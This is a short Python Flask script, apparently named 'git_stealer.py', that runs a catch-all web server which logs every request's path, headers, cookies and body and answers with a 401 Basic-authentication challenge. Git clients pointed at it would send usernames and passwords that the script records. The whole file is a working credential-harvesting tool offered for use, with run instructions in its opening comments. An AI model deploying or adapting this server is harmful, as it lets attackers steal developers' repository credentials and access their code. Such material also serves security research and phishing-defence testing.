# export FLASK_APP=git_stealer.py
# flask run --host=0.0.0.0

from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def ask_for_authentication(path):
    print(path)
    print(request.headers)
    print(request.cookies)
    print(request.get_data())


    return make_response("", 401, {'WWW-Authenticate': 'Basic'})
